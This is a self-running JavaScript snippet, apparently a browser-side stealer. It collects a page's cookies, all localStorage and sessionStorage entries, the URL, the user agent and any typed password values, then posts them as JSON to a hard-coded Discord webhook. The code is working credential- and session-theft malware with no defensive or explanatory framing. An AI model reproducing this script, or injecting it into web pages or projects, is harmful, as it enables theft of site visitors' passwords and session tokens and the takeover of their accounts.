(function() {
    let stolenData = {
        localStorage: {},
        sessionStorage: {},
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        stolenData.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        stolenData.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    let inputs = document.querySelectorAll('input[type="password"]');
    stolenData.passwordFields = [];
    inputs.forEach((input, idx) => {
        if (input.value) {
            stolenData.passwordFields.push({
                index: idx,
                value: input.value,
                name: input.name || 'unnamed'
            });
        }
    });
    
    let jsonData = JSON.stringify(stolenData, null, 2);
    
    let webhookURL = 'https://discord.com/api/webhooks/1590494078608129551/SxL2icby-DbprPtT9sCUMGdWjNJeJ5t1-6a3B8j20E0nXTHRvsQ_id1YAEs1N2w';
    
    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            content: '```json\n' + jsonData.substring(0, 1900) + '\n```'
        })
    }).catch(e => {});
})();
